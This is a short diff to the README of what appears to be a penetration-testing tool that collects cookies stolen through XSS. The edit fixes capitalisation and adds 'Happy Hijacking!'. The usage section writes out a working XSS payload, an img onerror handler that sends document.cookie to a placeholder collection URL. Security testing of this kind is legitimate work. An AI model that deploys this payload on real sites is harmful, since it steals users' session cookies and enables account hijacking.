@@ -21,7 +21,9 @@ Integrate into IFTTT for Alterting Options
 Just host the PHP files on a web server and import the SQL Dump to create the schema.
 
 # Use
-When XSS is Discovered During an Application Security or Penetration Test, Simply Use `<img src=x onerror=this.src='https://YOUR-URL-HERE.com/XSS.php?project=YOUR-PROJECT-HERE&cookie='+document.cookie> height=1 width=1` or a Similar Payload.  You may need to modify based on filtering of course, but as long as you're posting data to that URI it should work.
+When XSS is discovered during an Application Security or Penetration Test, simply use `<img src=x onerror=this.src='https://YOUR-URL-HERE.com/XSS.php?project=YOUR-PROJECT-HERE&cookie='+document.cookie> height=1 width=1` or a similar payload.  You may need to modify based on filtering of course, but as long as you're posting data to that URI it should work!
+
+Happy Hijacking!
 
 
 
